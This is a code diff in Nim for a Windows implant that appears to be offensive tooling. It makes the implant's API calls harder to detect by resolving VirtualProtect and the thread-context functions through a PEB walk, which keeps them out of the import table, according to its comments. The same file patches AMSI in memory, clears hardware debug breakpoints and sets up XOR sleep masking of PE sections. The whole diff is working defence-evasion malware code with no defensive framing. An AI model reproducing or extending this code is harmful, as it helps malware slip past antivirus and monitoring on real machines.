@@ -7,13 +7,16 @@ when defined(windows):
   import std/[os, strutils, random]
   import config
   import ./syscalls
+  import ./api_hash
 
   # ── Byte patching helper ──────────────────────────────────────────────────────
   proc patchBytes(address: LPVOID; patch: openArray[byte]) =
     var oldProt: DWORD
-    discard VirtualProtect(address, patch.len, PAGE_EXECUTE_READWRITE, addr oldProt)
+    # VirtualProtect resolved via PEB walk — no IAT entry
+    discard callVirtualProtect(address, SIZE_T(patch.len),
+                               PAGE_EXECUTE_READWRITE, addr oldProt)
     copyMem(address, unsafeAddr patch[0], patch.len)
-    discard VirtualProtect(address, patch.len, oldProt, addr oldProt)
+    discard callVirtualProtect(address, SIZE_T(patch.len), oldProt, addr oldProt)
 
   # ── AMSI ──────────────────────────────────────────────────────────────────────
   proc patchAMSI*() =
@@ -52,15 +55,18 @@ when defined(windows):
 
   # ── Hardware breakpoint clear ─────────────────────────────────────────────────
   proc clearHWBP*() =
-    let h = OpenThread(THREAD_GET_CONTEXT or THREAD_SET_CONTEXT, 0, GetCurrentThreadId())
+    # OpenThread/GetThreadContext/SetThreadContext/CloseHandle resolved via
+    # PEB walk — none of these appear in the IAT.
+    let h = callOpenThread(THREAD_GET_CONTEXT or THREAD_SET_CONTEXT,
+                           WINBOOL(0), GetCurrentThreadId())
     if h == 0: return
-    defer: discard CloseHandle(h)
+    defer: discard callCloseHandle(h)
     var ctx: CONTEXT
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
-    if GetThreadContext(h, addr ctx) == 0: return
+    if callGetThreadContext(h, addr ctx) == 0: return
     ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr2 = 0; ctx.Dr3 = 0
     ctx.Dr6 = 0; ctx.Dr7 = 0
-    discard SetThreadContext(h, addr ctx)
+    discard callSetThreadContext(h, addr ctx)
 
   # ── Sleep masking (XOR encrypt non-exec PE sections during sleep) ─────────────
   const XOR_SLEEP_KEY: byte = 0xA7
